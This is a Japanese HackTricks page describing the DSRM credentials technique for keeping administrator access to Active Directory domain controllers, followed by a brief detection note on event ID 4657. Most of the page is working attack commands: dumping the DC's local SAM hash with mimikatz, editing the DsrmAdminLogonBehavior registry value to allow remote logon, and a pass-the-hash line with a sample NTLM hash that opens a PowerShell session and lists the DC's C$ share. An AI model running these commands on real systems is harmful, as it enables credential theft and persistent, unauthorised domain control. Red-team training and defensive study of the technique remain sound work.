<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)をフォローする。
* **ハッキングトリックを共有するためにPRを提出して** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリに。

</details>


# DSRM 資格情報

各 **DC** 内には **ローカル管理者** アカウントがあります。このマシンで管理者権限を持っていると、mimikatz を使用して **ローカル管理者のハッシュをダンプ** できます。その後、レジストリを変更してこのパスワードを **アクティブ化** し、このローカル管理者ユーザーにリモートアクセスできます。\
まず、DC内の **ローカル管理者** ユーザーの **ハッシュ** を **ダンプ** する必要があります：
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
次に、そのアカウントが機能するかどうかを確認し、レジストリキーの値が「0」であるか存在しない場合は、**それを「2」に設定する必要があります**：
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
次に、PTHを使用してC$の内容をリストしたり、シェルを取得したりすることができます。注意すべきは、そのハッシュを使用してメモリ内で新しいPowerShellセッションを作成する場合（PTHの場合）、使用される「ドメイン」はDCマシンの名前だけであることです。
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
## 対策

* イベントID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior` の作成/変更の監査

詳細はこちら：[https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) および [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)
